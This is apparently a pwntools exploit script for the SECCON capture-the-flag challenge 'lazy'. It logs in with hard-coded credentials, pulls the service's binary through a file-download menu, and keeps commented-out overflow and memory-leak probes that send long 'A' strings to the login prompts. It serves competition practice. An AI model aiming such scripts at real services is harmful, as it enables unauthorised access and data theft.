#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys
import struct

FILENAME = "./lazy"

rhp1 = {"host":"lazy.chal.seccon.jp","port":33333}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
#binf = ELF(FILENAME)

def login(conn,user,pw):
  conn.recvuntil("3: Exit\n")
  conn.sendline("2")
  conn.recvuntil("username : ")
  conn.sendline(user) #need newline
  conn.recvuntil("password : ")
  conn.sendline(pw)

username = "_H4CK3R_"
pw = "3XPL01717"
counter = 0

def exploit(conn):
  login(conn,username,pw)
  
  conn.recvuntil("4: Manage\n")
  conn.sendline("4")
  conn.recvuntil("Input file name\n")
  conn.sendline("lazy")
  conn.recvuntil("bytes")
  binary = conn.recvrepeat()

  out = open("./lazy","w")
  out.write(binary)
  out.close()

  #login(conn,username,"A"*50)
  #login(conn,"A"*(100-5-0x10),"pw")
  #conn.recvuntil("A\n")
  #data = unpack(conn.recvline()[:-1].ljust(8,"\x00"))
  #print("[+]"+hex(data))


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

